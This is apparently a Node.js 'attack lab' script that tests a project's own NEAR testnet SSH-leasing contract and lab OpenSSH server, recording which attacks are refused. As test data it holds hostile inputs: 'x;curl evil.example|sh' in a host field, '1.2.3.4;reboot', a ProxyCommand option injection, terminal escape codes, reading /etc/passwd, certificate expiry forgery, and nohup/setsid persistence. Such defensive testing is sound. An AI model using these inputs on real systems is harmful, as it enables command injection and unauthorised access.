// The Attack Lab. Runs real attacks against the live contract and real OpenSSH, and records what
// stopped each one. Contract refusals are real failed transactions, so anyone can look them up.
//   node scripts/attack-lab.mjs
// Needs the Debian VM, or any server whose SSH you control, at the host in LAB_HOST.
import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { Near, refusalCode } from '../cli/src/near.js';
import { leaseConnection, rentWithNear } from '../cli/src/leases.js';
import { execSsh, newKeyPair, opensshPrivateKey, publicKeyLine, sshArgs } from '../cli/src/ssh.js';
import { walletFor } from '../cli/src/evm.js';
import { Serial } from './vm/serial.mjs';

const root = path.join(path.dirname(fileURLToPath(import.meta.url)), '..');
const env = Object.fromEntries(fs.readFileSync(path.join(root, '.env'), 'utf8').trim().split(/\r?\n/).map((l) => l.split('=')));
const contract = env.CONTRACT;
const strangerId = process.env.LAB_STRANGER ?? 'lk-spike-iv2ae4.testnet';

const owner = new Near({ accountId: env.OWNER });
const tenant = new Near({ accountId: env.TENANT });
const stranger = new Near({ accountId: strangerId });
const reader = new Near();

const about = await reader.view(contract, 'about');
if (about.build !== 'release') throw new Error(`Attack the release build, not ${about.build}`);

const scratch = fs.mkdtempSync(path.join(os.tmpdir(), 'sublet-lab-'));
const known = path.join(scratch, 'known_hosts');
const FEE = BigInt(about.lease_fee);
const UNIT_FEE = BigInt(about.unit_fee);
const results = [];

function record(attack, expected, got, tx, note, signer) {
  const stopped = got === expected;
  results.push({ attack, expected, result: got, stopped, tx: tx ?? null, signer: signer ?? null, note: note ?? null });
  console.log(`[${stopped ? 'STOPPED' : 'NOT STOPPED'}] ${attack}\n    ${got}${tx ? `  ${near_url(tx)}` : ''}`);
}

const near_url = (tx) => `${reader.config.explorer}${tx}`;

async function refused(attack, expected, near, method, args, options = {}) {
  const outcome = await near.call(contract, method, args, { gasTera: 100, ...options });
  const got = outcome.success ? 'ACCEPTED' : refusalCode(outcome.error) ?? (outcome.error ?? '').slice(0, 80);
  record(attack, expected, got, outcome.hash, null, near.accountId);
  return outcome;
}

const baseTerms = {
  title: 'Attack lab',
  blurb: '',
  host: process.env.LAB_HOST ?? '127.0.0.1',
  port: Number(process.env.LAB_PORT ?? 2222),
  principal: 'tenant',
  command: null,
  evict_user: true,
  permit_pty: false,
  permit_port_forwarding: false,
  tick_secs: 60,
  max_ticks: 5,
  near_per_tick: String(10n ** 22n),
  foreign: [],
  allowlist: null,
  needs_approval: false,
};

async function list(id, overrides = {}) {
  const outcome = await owner.call(contract, 'list_unit', { id, terms: { ...baseTerms, ...overrides } }, { gasTera: 100, depositYocto: UNIT_FEE });
  if (!outcome.success) throw new Error(`could not list ${id}: ${outcome.error}`);
  return reader.view(contract, 'get_unit', { id });
}

// ---- Real Base data, for the foreign attacks ---------------------------------------------------

const USDC = '0x036cbd53842c5426634e7929541ec2318f3dcf7e';
const TRANSFER = '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef';

async function baseRpc(method, params) {
  const response = await fetch('https://base-sepolia-rpc.publicnode.com', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  });
  const body = await response.json();
  if (body.error) throw new Error(JSON.stringify(body.error));
  return body.result;
}

async function realTransfer() {
  const head = parseInt(await baseRpc('eth_blockNumber', []), 16);
  for (let end = head - 20; end > head - 2000; end -= 100) {
    const logs = await baseRpc('eth_getLogs', [{
      address: USDC, topics: [TRANSFER], fromBlock: `0x${(end - 99).toString(16)}`, toBlock: `0x${end.toString(16)}`,
    }]);
    const log = logs.filter((l) => BigInt(l.data) > 0n && l.topics.length === 3).pop();
    if (log) return log;
  }
  throw new Error('no recent USDC transfer');
}

const contractLog = (log) => ({
  removed: false,
  log_index: parseInt(log.logIndex, 16),
  transaction_index: parseInt(log.transactionIndex, 16),
  transaction_hash: log.transactionHash.toLowerCase(),
  block_hash: log.blockHash.toLowerCase(),
  block_number: parseInt(log.blockNumber, 16),
  address: log.address.toLowerCase(),
  data: log.data.toLowerCase(),
  topics: log.topics.map((t) => t.toLowerCase()),
});

// ---- Set up the lab -----------------------------------------------------------------------------

const stamp = Date.now().toString(36);
// One Unix user per unit: the contract refuses anything else, and eviction depends on it.
const openUnit = await list(`lab-open-${stamp}`);
const fixedUnit = await list(`lab-fixed-${stamp}`, { principal: 'tenant2', command: 'echo only-this-command' });
const otherUnit = await list(`lab-other-${stamp}`, { host: 'a-different-server.example' });
const privateUnit = await list(`lab-private-${stamp}`, { principal: 'lab-private', allowlist: [env.TENANT] });
const pausedUnit = await list(`lab-paused-${stamp}`, { principal: 'lab-paused' });
const approvalUnit = await list(`lab-approval-${stamp}`, { principal: 'lab-approval', needs_approval: true });

const real = await realTransfer();
const payTo = `0x${real.topics[2].slice(-40)}`;
const baseUnit = await list(`lab-base-${stamp}`, {
  principal: 'lab-base',
  near_per_tick: '0',
  foreign: [{ chain: 'Base', token: USDC, pay_to: payTo, amount_per_tick: '1', finality: 'Latest' }],
});
console.log(`lab units listed, with suffix ${stamp}`);

await owner.call(contract, 'set_paused', { id: pausedUnit.id, paused: true }, { gasTera: 30 });

const serial = new Serial();
await serial.connect();
await serial.login();
await serial.run(`printf '%s\\n' '${openUnit.ca_public_key}' '${fixedUnit.ca_public_key}' > /etc/ssh/sublet_ca.pub`);
await serial.run('id tenant2 >/dev/null 2>&1 || useradd -m -s /bin/bash tenant2');
await serial.run('systemctl reload ssh');

const sshKey = newKeyPair(path.join(scratch, 'k1'), 'lab');

// ---- Contract attacks ---------------------------------------------------------------------------

console.log('\n--- attacks on the contract ---');

await refused('Pay less than the rent', 'E_UNDERPAID', stranger, 'rent',
  { unit_id: openUnit.id, ticks: 1, ssh_key: sshKey.publicLine, source_address: null }, { depositYocto: FEE });

await refused('Ask for more time than the owner allows', 'E_BAD_TICKS', stranger, 'rent',
  { unit_id: openUnit.id, ticks: 6, ssh_key: sshKey.publicLine, source_address: null }, { depositYocto: 7n * FEE });

await refused('Rent a machine the owner has paused', 'E_PAUSED', stranger, 'rent',
  { unit_id: pausedUnit.id, ticks: 1, ssh_key: sshKey.publicLine, source_address: null }, { depositYocto: 2n * FEE });

await refused('Rent a private machine as a stranger', 'E_NOT_ALLOWED', stranger, 'rent',
  { unit_id: privateUnit.id, ticks: 1, ssh_key: sshKey.publicLine, source_address: null }, { depositYocto: 2n * FEE });

await refused('Smuggle a shell command in as an IP address', 'E_BAD_SOURCE_ADDRESS', stranger, 'rent',
  { unit_id: openUnit.id, ticks: 1, ssh_key: sshKey.publicLine, source_address: '1.2.3.4;reboot' }, { depositYocto: 2n * FEE });

await refused("Rewrite another owner's terms", 'E_NOT_OWNER', stranger, 'update_terms',
  { id: openUnit.id, terms: { ...baseTerms, near_per_tick: '0' } });

await refused("Pause another owner's machine", 'E_NOT_OWNER', stranger, 'set_paused', { id: openUnit.id, paused: true });

await refused('Delist another owner\'s machine', 'E_NOT_OWNER', stranger, 'delist_unit', { id: openUnit.id });

await refused('Take over a listed machine\'s name', 'E_UNIT_EXISTS', stranger, 'list_unit',
  { id: openUnit.id, terms: { ...baseTerms, principal: 'squatter' } }, { depositYocto: UNIT_FEE });

await refused('List a machine as root', 'E_ROOT_NOT_ALLOWED', stranger, 'list_unit',
  { id: `lab-root-${stamp}`, terms: { ...baseTerms, principal: 'root' } }, { depositYocto: UNIT_FEE });

await refused('List one Unix user twice, so two tenants share it', 'E_USER_ALREADY_LISTED', owner, 'list_unit',
  { id: `lab-twice-${stamp}`, terms: baseTerms }, { depositYocto: UNIT_FEE });

// These reach a visitor's terminal: the website tells them to paste a command built from the host.
await refused('Hide a shell command in a server address, for a visitor to paste', 'E_BAD_HOST', stranger, 'list_unit',
  { id: `lab-paste-${stamp}`, terms: { ...baseTerms, principal: 'lab-paste', host: 'x;curl evil.example|sh' } }, { depositYocto: UNIT_FEE });

await refused('Hide an ssh option in a Unix user name', 'E_BAD_PRINCIPAL', stranger, 'list_unit',
  { id: `lab-option-${stamp}`, terms: { ...baseTerms, principal: '-oProxyCommand=evil' } }, { depositYocto: UNIT_FEE });

await refused('Hide terminal escape codes in a listing', 'E_BAD_TITLE', stranger, 'list_unit',
  { id: `lab-escape-${stamp}`, terms: { ...baseTerms, principal: 'lab-escape', title: 'Nice box\u001b]0;owned\u0007' } }, { depositYocto: UNIT_FEE });

const request = await tenant.call(contract, 'rent', { unit_id: approvalUnit.id, ticks: 1, ssh_key: sshKey.publicLine, source_address: null }, { gasTera: 100, depositYocto: 2n * FEE });
await refused('Approve your own request', 'E_NOT_OWNER', tenant, 'approve', { lease_id: request.value.id });
await refused('Cancel someone else\'s request', 'E_NOT_TENANT', stranger, 'cancel', { lease_id: request.value.id });

const privateCall = await stranger.call(contract, 'on_signed', { id: 1, tbs: '00' }, { gasTera: 30 });
record('Call the signing callback directly, to forge a certificate', 'Method on_signed is private',
  privateCall.success ? 'ACCEPTED' : (String(privateCall.error).match(/Method \w+ is private/)?.[0] ?? String(privateCall.error).slice(0, 80)), privateCall.hash, null, strangerId);

console.log('\n--- attacks on foreign payments ---');
const attacker = walletFor(env.EVM_TENANT_KEY);
const attackerTopic = `0x${'0'.repeat(24)}${attacker.address.slice(2).toLowerCase()}`;
const log = contractLog(real);
const claimFor = async (claimedLog, unit, signer = attacker) => {
  const message = await reader.view(contract, 'claim_message', {
    unit_id: unit.id, ssh_key: sshKey.publicLine, chain: 'Base', tx: claimedLog.transaction_hash, log_index: claimedLog.log_index,
  });
  return {
    unit_id: unit.id, chain: 'Base', log: claimedLog, ssh_key: sshKey.publicLine,
    payer_signature: await signer.signMessage({ message }), source_address: null,
  };
};

await refused('Claim a stranger\'s real payment for your own key', 'E_WRONG_PAYER', stranger, 'rent_foreign',
  await claimFor(log, baseUnit), { gasTera: 300, depositYocto: FEE });

await refused('Claim a payment made in another token', 'E_WRONG_TOKEN', stranger, 'rent_foreign',
  await claimFor({ ...log, address: `0x${'11'.repeat(20)}` }, baseUnit), { gasTera: 300, depositYocto: FEE });

await refused('Claim a payment sent to someone else', 'E_WRONG_RECIPIENT', stranger, 'rent_foreign',
  await claimFor({ ...log, topics: [log.topics[0], log.topics[1], `0x${'0'.repeat(24)}${'22'.repeat(20)}`] }, baseUnit), { gasTera: 300, depositYocto: FEE });

await refused('Pass off a different event as a transfer', 'E_NOT_A_TRANSFER', stranger, 'rent_foreign',
  await claimFor({ ...log, topics: [`0x${'33'.repeat(32)}`, log.topics[1], log.topics[2]] }, baseUnit), { gasTera: 300, depositYocto: FEE });

await refused('Claim on a chain the owner does not accept', 'E_CHAIN_NOT_ACCEPTED', stranger, 'rent_foreign',
  { ...(await claimFor(log, baseUnit)), chain: 'Polygon' }, { gasTera: 300, depositYocto: FEE });

// ---- SSH attacks --------------------------------------------------------------------------------

console.log('\n--- attacks on the server ---');

const ssh = (args) => spawnSync('ssh', args, { encoding: 'utf8', timeout: 60_000 });
const lastLine = (r) => (r.stderr || r.stdout || '').trim().split('\n').pop();
const denied = (r) => (r.status === 255 ? 'Permission denied' : `exit ${r.status}: ${lastLine(r)}`);

const lone = newKeyPair(path.join(scratch, 'k2'), 'nobody');
const noLease = ssh(['-p', String(baseTerms.port), '-i', lone.keyPath, '-o', 'IdentitiesOnly=yes', '-o', 'BatchMode=yes',
  '-o', 'StrictHostKeyChecking=no', '-o', `UserKnownHostsFile=${known}`, `tenant@${baseTerms.host}`, 'whoami']);
record('Log in with no lease', 'Permission denied', denied(noLease));

const live = await rentWithNear(tenant, contract, openUnit.id, 1);
const options = { ...leaseConnection(contract, openUnit, live.lease), knownHosts: known };
const works = execSsh(options, 'whoami', 'ssh', 60_000);
console.log(`control: a real lease logs in as ${works.stdout || works.stderr}`);

await refused('Rent a machine someone else holds', 'E_OCCUPIED', stranger, 'rent',
  { unit_id: openUnit.id, ticks: 1, ssh_key: sshKey.publicLine, source_address: null }, { depositYocto: 2n * FEE });

// Certificates are public, because they are stored on chain. Possession of the key must matter.
const thief = crypto.generateKeyPairSync('ed25519');
const jwk = thief.privateKey.export({ format: 'jwk' });
const thiefDir = path.join(scratch, 'thief');
fs.mkdirSync(thiefDir);
const thiefKey = path.join(thiefDir, 'id_ed25519');
fs.writeFileSync(thiefKey, opensshPrivateKey(Buffer.from(jwk.d, 'base64url'), Buffer.from(jwk.x, 'base64url'), 'thief'), { mode: 0o600 });
if (process.platform === 'win32') spawnSync('icacls', [thiefKey, '/inheritance:r', '/grant:r', `${process.env.USERNAME}:(R,W)`], { stdio: 'ignore' });
const stolen = path.join(thiefDir, 'stolen-cert.pub');
fs.writeFileSync(stolen, `${live.lease.certificate}\n`);
const withStolen = ssh(sshArgs({ ...options, keyPath: thiefKey, certPath: stolen, extra: ['-o', 'BatchMode=yes'] }).concat('whoami'));
record('Copy a tenant\'s public certificate from the chain and use it', 'Permission denied', denied(withStolen));

// Walk the certificate's wire format to the expiry field, and push it a year out.
function extendExpiry(line) {
  const parts = line.split(' ');
  const cert = Buffer.from(parts[1], 'base64');
  let at = 0;
  const skip = () => { at += 4 + cert.readUInt32BE(at); };
  skip(); skip(); skip(); // type, nonce, public key
  at += 8 + 4; // serial, cert type
  skip(); skip(); // key id, principals
  at += 8; // valid after
  cert.writeBigUInt64BE(cert.readBigUInt64BE(at) + 31_536_000n, at);
  return `${parts[0]} ${cert.toString('base64')} ${parts[2] ?? ''}`.trim();
}
const forged = path.join(path.dirname(options.keyPath), 'forged-cert.pub');
fs.writeFileSync(forged, `${extendExpiry(live.lease.certificate)}\n`);
const withForged = ssh(sshArgs({ ...options, certPath: forged, extra: ['-o', 'BatchMode=yes'] }).concat('whoami'));
fs.rmSync(forged);
record('Edit a certificate to last another year', 'Permission denied', denied(withForged));

const other = await rentWithNear(tenant, contract, otherUnit.id, 1);
const crossed = execSsh({ ...leaseConnection(contract, otherUnit, other.lease), host: baseTerms.host, knownHosts: known }, 'whoami', 'ssh', 60_000);
record('Use a key cut for one machine on another', 'Permission denied', crossed.code === 255 ? 'Permission denied' : `exit ${crossed.code}: ${crossed.stdout}`);

// -L only binds a local port, so it proves nothing. -W opens a forwarded channel on the server, and
// -R asks the server to listen. Both reach the server's refusal directly.
const tunnel = ssh(sshArgs({ ...options, extra: ['-o', 'BatchMode=yes', '-W', '127.0.0.1:22'] }));
record('Tunnel through the machine to another service', 'Forwarding refused',
  /administratively prohibited/i.test(tunnel.stderr ?? '') ? 'Forwarding refused' : `exit ${tunnel.status}: ${lastLine(tunnel)}`);

const listener = ssh(sshArgs({
  ...options,
  extra: ['-o', 'BatchMode=yes', '-o', 'ExitOnForwardFailure=yes', '-R', '127.0.0.1:18022:127.0.0.1:22'],
}).concat('true'));
record('Make the machine listen on a port for you', 'Forwarding refused',
  /forwarding failed/i.test(listener.stderr ?? '') ? 'Forwarding refused' : `exit ${listener.status}: ${lastLine(listener)}`);

const fixed = await rentWithNear(tenant, contract, fixedUnit.id, 1);
const ignored = execSsh({ ...leaseConnection(contract, fixedUnit, fixed.lease), knownHosts: known }, 'cat /etc/passwd', 'ssh', 60_000);
record('Run your own command on a fixed-command machine', 'The owner\'s command ran instead', ignored.stdout === 'only-this-command' ? 'The owner\'s command ran instead' : `exit ${ignored.code}: ${ignored.stdout.slice(0, 60)}`);

const shellTrick = execSsh({ ...leaseConnection(contract, fixedUnit, fixed.lease), knownHosts: known }, '; cat /etc/passwd #', 'ssh', 60_000);
record('Inject a command past the fixed command', 'The owner\'s command ran instead', shellTrick.stdout === 'only-this-command' ? 'The owner\'s command ran instead' : `exit ${shellTrick.code}: ${shellTrick.stdout.slice(0, 60)}`);

const ends = Number(live.lease.valid_before);
const planted = execSsh(options, 'nohup sh -c "while :; do sleep 7; done" >/dev/null 2>&1 & setsid sh -c "while :; do sleep 9; done" >/dev/null 2>&1 & echo planted', 'ssh', 60_000);
const skew = Number((await serial.run('date +%s')).output) - Math.floor(Date.now() / 1000);
const waitMs = (ends - skew - Math.floor(Date.now() / 1000) + 5) * 1000;
console.log(`waiting ${Math.round(waitMs / 1000)}s for the lease to end (planted: ${planted.stdout})`);
await new Promise((resolve) => setTimeout(resolve, Math.max(0, waitMs)));
const { output: survivors } = await serial.run('ps -u tenant -o args= | grep -E "sleep (7|9)$" || true', { check: false });
record('Leave nohup and setsid processes running past the end', 'All processes killed', survivors ? `Survived: ${survivors}` : 'All processes killed');

await new Promise((resolve) => setTimeout(resolve, Math.max(0, (skew + 3) * 1000)));
const expired = execSsh(options, 'whoami', 'ssh', 60_000);
record('Log back in after the lease ends', 'Permission denied', expired.code === 255 ? 'Permission denied' : `exit ${expired.code}: ${expired.stdout}`);

// ---- The one only the MPC network can stop ------------------------------------------------------

console.log('\n--- a payment that never happened ---');
console.log('Every field looks valid and the attacker signs it, so all local checks pass. Only the network can refuse.');
const invented = {
  ...log,
  data: `0x${'0'.repeat(56)}ffffffff`,
  topics: [log.topics[0], attackerTopic, log.topics[2]],
};
const inventedArgs = await claimFor(invented, baseUnit, attacker);
const inventedHash = await stranger.submit(contract, [
  (await import('../cli/src/near.js')).actions.functionCall('rent_foreign', inventedArgs, 300n * 10n ** 12n, FEE),
]);
const t0 = Date.now();
const inventedOutcome = await stranger.outcome(inventedHash, strangerId, 480_000);
const seconds = ((Date.now() - t0) / 1000).toFixed(0);
const inventedLease = inventedOutcome.value;
const issued = Boolean(inventedLease?.certificate);
const reclaimed = !(await reader.view(contract, 'is_payment_spent', { chain: 'Base', tx: invented.transaction_hash, log_index: invented.log_index }));
record('Invent a payment that never happened', 'No key cut',
  issued ? 'KEY ISSUED' : 'No key cut', inventedHash,
  `The MPC network would not attest it. Lease status ${inventedLease?.status ?? 'none'} after ${seconds}s. Payment marked free again: ${reclaimed}.`, strangerId);

serial.close();
fs.rmSync(scratch, { recursive: true, force: true });

const stoppedCount = results.filter((r) => r.stopped).length;
console.log(`\n${stoppedCount} of ${results.length} attacks stopped`);
const report = { contract, run_at: new Date().toISOString(), network: 'testnet', stopped: stoppedCount, total: results.length, results };
fs.writeFileSync(path.join(root, 'docs', 'attack-lab-results.json'), `${JSON.stringify(report, null, 2)}\n`);
fs.writeFileSync(
  path.join(root, 'web', 'src', 'attacks.json'),
  `${JSON.stringify(results.map(({ attack, result, tx }) => ({ attack, result, tx })), null, 2)}\n`,
);
process.exit(stoppedCount === results.length ? 0 : 1);
